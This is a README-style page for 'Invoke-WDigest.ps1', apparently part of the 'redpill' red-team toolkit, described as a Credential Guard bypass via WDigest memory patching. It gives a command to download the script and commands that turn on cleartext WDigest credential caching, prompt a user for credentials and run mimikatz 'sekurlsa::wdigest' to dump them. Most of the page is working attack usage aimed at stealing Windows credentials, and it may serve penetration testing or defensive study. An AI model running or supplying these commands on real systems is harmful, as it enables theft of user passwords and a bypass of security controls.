## Invoke-WDigest.ps1

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|[Invoke-WDigest](https://github.com/r00t-3xp10it/redpill/blob/main/lib/DeviceGuard/Invoke-WDigest.ps1)|Credential Guard Bypass Via Patching Wdigest Memory|Administrator|Credits: @wh0nsq, @BenjaminDelpy|

<br />

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1" -OutFile "Invoke-WDigest.ps1"
```

<br />

**run cmdlet:**
```powershell
# Execute M[i]mika[t]z (interactive shell) without WDigest caching
.\Invoke-WDigest.ps1 -wdigest 'false' -mimicats

#  Ativate WDigest caching + Execute M[i]mika[t]z sekurlsa::wdigest
.\Invoke-WDigest.ps1 -wdigest 'true' -mimicats

[FAST DEMONSTRATION]

## Ativate WDigest caching + dump credentials
.\Invoke-WDigest.ps1 -WDigest 'true' -mimicats -runas

WORKFLOW
   - Invoke-WDigest.ps1 Ativates WDigest caching in memory
   - Invoke-WDigest.ps1 prompts user to enter credential to start cmd.exe
   - WDigest will store credential input by user in clear-text in memory
   - mimikatz will auto-execute 'sekurlsa::wdigest exit' to dump credentials

REMARK
   RunAs parameter switch exists for demonstration effects, and can not be
   used remotely because it requires target user interaction (prompt cred)
   and resource UserName password knowledge ..
```

<br />

![poc](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.png)
